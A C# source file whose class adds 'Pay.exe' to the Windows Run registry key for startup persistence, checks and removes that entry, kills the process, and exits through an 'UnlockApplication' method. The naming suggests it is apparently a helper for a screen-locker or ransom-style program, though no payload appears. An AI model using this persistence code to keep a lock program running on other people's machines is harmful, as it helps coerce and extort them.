using System;
using System.IO;
using System.Diagnostics;
using System.Windows.Forms;
using Microsoft.Win32;

namespace M_Engine
{
    public class Handle
    {
        public static string ad { get; private set; }
        public static string ap { get; private set; }
        public const string a = "Pay.exe";
        private const string rsk = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";

        static Handle()
        {
            InitializePaths();
        }

        private static void InitializePaths()
        {
            ad = Environment.CurrentDirectory;
            ap = Path.Combine(ad, a);
        }

        public static void adtsup()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(rsk, true))
                {
                    if (key != null)
                    {
                        key.SetValue(a, ap);
                        Debug.WriteLine("Added to startup successfully.");
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error adding to startup: {ex.Message}");
            }
        }

        public static void rmvstup()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(rsk, true))
                {
                    if (key != null && isstup())
                    {
                        key.DeleteValue(a, false);
                        Debug.WriteLine("Removed from startup successfully.");
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error removing from startup: {ex.Message}");
            }
        }

        public static bool isstup()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(rsk, false))
                {
                    if (key != null)
                    {
                        var value = key.GetValue(a) as string;
                        return !string.IsNullOrEmpty(value) &&
                               string.Equals(value, ap, StringComparison.OrdinalIgnoreCase);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error checking startup: {ex.Message}");
            }
            return false;
        }

        public static void kill(string processName)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(processName))
                {
                    Debug.WriteLine("Process name cannot be empty");
                    return;
                }

                Process[] processes = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(processName));
                foreach (Process process in processes)
                {
                    try
                    {
                        process.Kill();
                        process.WaitForExit(1000);
                        Debug.WriteLine($"Killed process: {processName}");
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error killing process {processName}: {ex.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"General error in KillProcess: {ex.Message}");
            }
        }

        public static void UnlockApplication()
        {
            kill(a);
            rmvstup();
            Application.Exit();
        }
    }
}
